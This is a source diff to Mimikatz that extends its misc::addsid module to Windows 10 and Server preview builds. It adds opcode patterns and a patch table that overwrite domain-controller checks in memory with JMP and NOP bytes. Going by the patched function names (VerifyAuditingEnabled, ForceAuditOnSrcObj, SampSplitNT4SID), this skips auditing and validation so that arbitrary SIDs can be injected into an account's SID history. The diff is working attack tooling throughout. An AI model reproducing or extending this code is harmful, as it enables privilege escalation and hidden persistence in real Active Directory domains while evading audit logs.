@@ -330,9 +330,18 @@ NTSTATUS kuhl_m_misc_wifi(int argc, wchar_t * argv[])
 BYTE PTRN_JMP[]			= {0xeb};
 BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
 
+BYTE PTRN_WN64_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
+BYTE PTRN_WN64_1[]		= {0xfa, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
+BYTE PTRN_WN64_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24}; // VerifySrcAuditingEnabledAndGetFlatName
+BYTE PTRN_WN64_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x88, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
+BYTE PTRN_WN64_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
+BYTE PTRN_WN64_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x59, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
+BYTE PTRN_WN64_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
+BYTE PTRN_WN64_7[]		= {0x8b, 0x84, 0x24, 0x6c, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
+
 BYTE PTRN_WN81_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
 BYTE PTRN_WN81_1[]		= {0xc2, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
-BYTE PTRN_WN81_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0, 0x00, 0x00, 0x00}; // VerifySrcAuditingEnabledAndGetFlatName
+BYTE PTRN_WN81_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24/*, 0xc0, 0x00, 0x00, 0x00*/}; // VerifySrcAuditingEnabledAndGetFlatName
 BYTE PTRN_WN81_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x60, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
 BYTE PTRN_WN81_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
 BYTE PTRN_WN81_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x1c, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
@@ -348,6 +357,16 @@ BYTE PTRN_W8R2_5[]		= {0xc7, 0x44, 0x24, 0x74, 0xed, 0x06, 0x1a, 0x01, 0x8b}; //
 BYTE PTRN_W8R2_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
 BYTE PTRN_W8R2_7[]		= {0x44, 0x8b, 0x9c, 0x24, 0x80, 0x01, 0x00, 0x00, 0x41, 0x81, 0xfb, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
 
+KULL_M_PATCH_MULTIPLE wservprev[] = {
+	{{sizeof(PTRN_WN64_0), PTRN_WN64_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+	{{sizeof(PTRN_WN64_1), PTRN_WN64_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
+	{{sizeof(PTRN_WN64_2), PTRN_WN64_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
+	{{sizeof(PTRN_WN64_3), PTRN_WN64_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
+	{{sizeof(PTRN_WN64_4), PTRN_WN64_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
+	{{sizeof(PTRN_WN64_5), PTRN_WN64_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
+	{{sizeof(PTRN_WN64_6), PTRN_WN64_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
+	{{sizeof(PTRN_WN64_7), PTRN_WN64_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,},
+};
 KULL_M_PATCH_MULTIPLE w2k12r2[] = {
 	{{sizeof(PTRN_WN81_0), PTRN_WN81_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
 	{{sizeof(PTRN_WN81_1), PTRN_WN81_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
@@ -391,10 +410,15 @@ NTSTATUS kuhl_m_misc_addsid(int argc, wchar_t * argv[])
 			pOs = w2k8r2;
 			pOsSz = ARRAYSIZE(w2k8r2);
 		}
-		else if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE)
+		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
 		{
 			pOs = w2k12r2;
 			pOsSz = ARRAYSIZE(w2k12r2);
+		}
+		else if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
+		{
+			pOs = wservprev;
+			pOsSz = ARRAYSIZE(wservprev);
 		}
 
 		if(pOs && pOsSz)
@@ -490,6 +514,7 @@ NTSTATUS kuhl_m_misc_addsid(int argc, wchar_t * argv[])
 							}
 							CloseHandle(hProcess);
 						}
+						else PRINT_ERROR_AUTO(L"OpenProcess");
 					}
 					err = DsUnBindW(&hDs);
 				}
